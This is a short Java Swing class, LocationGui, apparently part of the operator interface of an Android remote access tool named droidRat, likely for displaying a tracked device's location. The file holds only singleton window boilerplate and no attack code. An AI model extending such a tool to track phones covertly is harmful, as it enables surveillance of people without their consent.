package com.je_chen.droidRat.gui.locationgui;

import com.je_chen.droidRat.gui.guisuper.GuiFather;
import com.je_chen.droidRat.gui.guisuper.GuiFatherInterface;

import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

public class LocationGui extends GuiFather implements GuiFatherInterface {
    private static LocationGui Instance;
    private JFrame jFrame;
    private JPanel jPanel;
    private String windowName;

    public static synchronized LocationGui getInstance(String windowName) {
        if (Instance == null) {
            Instance = new LocationGui();
            Instance.show(windowName);
        }
        return Instance;
    }

    @Override
    protected void inCloseEvent() {
        Instance = null;
    }
}
